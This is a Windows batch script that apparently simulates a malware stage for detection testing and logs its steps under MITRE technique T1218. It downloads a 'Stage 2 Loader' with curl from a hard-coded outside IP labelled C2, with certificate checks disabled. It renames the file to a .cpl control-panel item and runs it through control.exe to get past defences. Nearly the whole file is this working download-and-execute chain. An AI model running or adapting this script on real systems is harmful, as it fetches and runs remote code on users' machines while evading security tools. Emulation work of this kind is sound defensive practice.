@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET variables)
SET hK9mN3v=%APPDATA%\49768\b2ad51ca
SET pQ8wR2=bc6f67da.txt
SET aBcDeF12=https://3.144.153.50/test/stage/2/icon.png?QFxEQmc-R1dD
SET xYz7890=BALAM-S2B
SET qWeRtY56=QFxEQmc
SET uIoP1234=%PUBLIC%\\macula-simulations.log
SET lKjHgf98=https://3.144.153.50/test

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!xYz7890!][!qWeRtY56!]: heartbeat_start>> "!uIoP1234!" 2>nul

REM Step 1: Heartbeat fetch - download Stage 2 Loader from C2
curl -k -s -o "!hK9mN3v!\!pQ8wR2!" "!aBcDeF12!"
if !ERRORLEVEL! neq 0 (
    echo [!tsvar!][DEBUG][!xYz7890!][!qWeRtY56!]: heartbeat_result=1>> "!uIoP1234!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!xYz7890!][!qWeRtY56!]: heartbeat_complete>> "!uIoP1234!" 2>nul
)

REM Debug: chdir_start
echo [!tsvar!][DEBUG][!xYz7890!][!qWeRtY56!]: chdir_start>> "!uIoP1234!" 2>nul

REM Step 2: Position working directory
cd /d "!hK9mN3v!" >nul 2>&1
set chdir_rc=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!xYz7890!][!qWeRtY56!]: chdir_result=!chdir_rc!>> "!uIoP1234!" 2>nul

REM Step 3: Rename downloaded file to .cpl
FOR %%i IN ("!pQ8wR2!") DO SET base_cpl=%%~ni
ren "!pQ8wR2!" "!base_cpl!.cpl"
set ren_rc=!ERRORLEVEL!
if !ren_rc! equ 0 (
    echo [!tsvar!][DEBUG][!xYz7890!][!qWeRtY56!]: rename_complete>> "!uIoP1234!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!xYz7890!][!qWeRtY56!]: rename_result=!ren_rc!>> "!uIoP1234!" 2>nul
)

REM Debug and execute control.exe (LOLBIN)
echo [!tsvar!][DEBUG][!xYz7890!][!qWeRtY56!]: controlexec_start>> "!uIoP1234!" 2>nul
start /wait "" control.exe "!hK9mN3v!\!base_cpl!.cpl" >nul 2>&1
set cpl_exit=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!xYz7890!][!qWeRtY56!]: controlexec_result=!cpl_exit!>> "!uIoP1234!" 2>nul

REM Step 4: Logging - generate TTP timestamp
for /f "tokens=1-4 delims=:.," %%a in ("%time%") do set timestamp=%date% %%a:%%b:%%c.%%d

REM Determine result and error for TTP line
set ttp_result=OK
set ttp_error=
if !cpl_exit! neq 0 (
    set ttp_result=FAIL
    set ttp_error=EXITCODE=!cpl_exit!
)

REM Append TTP log line
>> "!uIoP1234!" echo [!timestamp!][TTP][!xYz7890!][!qWeRtY56!]: T1218^|System Binary Proxy Execution=!ttp_result!:!ttp_error!

ENDLOCAL
exit /b 0